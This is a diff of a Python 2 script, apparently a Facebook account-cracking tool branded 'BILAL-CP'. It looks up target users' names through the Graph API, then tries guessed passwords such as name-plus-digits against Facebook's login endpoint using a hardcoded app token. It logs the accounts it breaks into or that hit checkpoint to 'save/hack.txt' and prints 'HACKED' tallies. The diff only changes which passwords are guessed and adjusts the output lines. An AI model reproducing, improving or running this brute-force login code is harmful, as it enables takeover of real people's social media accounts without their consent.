@@ -297,7 +297,7 @@ def pilih_super():
         try:
             a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
             b = json.loads(a.text)
-            p6 = ['first_name'] + '123'
+            p1 = pw1
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
@@ -310,7 +310,7 @@ def pilih_super():
                 print '\x1b[1;93m[BILAL-CP] ' + user + ' |\x1b[0m ' + p1
                 cekpoint.append(user + p1)
             else:
-                p2 = 007007
+                p2 = pw2
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p2 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                 q = json.load(data)
                 if 'access_token' in q:
@@ -323,7 +323,7 @@ def pilih_super():
                     print '\x1b[1;;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p2
                     cekpoint.append(user + p2)
                 else:
-                    p3 = ['first_name'] + '1234'
+                    p3 = pw3
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p3 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                     q = json.load(data)
                     if 'access_token' in q:
@@ -336,7 +336,7 @@ def pilih_super():
                         print '\x1b[1;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p3
                         cekpoint.append(user + p3)
                     else:
-                   p4 = ['first_name'] + '12345'
+                        p4 = pw4
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p4 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                         q = json.load(data)
                         if 'access_token' in q:
@@ -378,7 +378,7 @@ def pilih_super():
                                 else:
                                     a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                     b = json.load(a.text)
-                                    p7 = b['first_name'] + '1234'
+                                    p7 = b['last_name'] + '123'
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p7 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                     q = json.load(data)
                                     if 'access_token' in q:
@@ -397,9 +397,9 @@ def pilih_super():
     p.map(main, id)
     print 25 * '-'
     print '\x1b[1;92m[CLONING DONE !'
-    print '\x1b[1;92m[HACKED] : ' + str(len(oks))
-    print '\x1b[1;92m[CHEEK] : ' + str(len(cekpoint))
-    print '\x1b[1;92m[File save] ~> save/hack.txt'
+    print '\x1b[1;92m[HACKED : ' + str(len(oks))
+    print '\x1b[1;92m[CHEEK : ' + str(len(cekpoint))
+    print '\x1b[1;92m[File save ~> save/hack.txt'
     print 25 * '-'
     print ' Thank you Using My Tools'
     os.sys.exit(0)
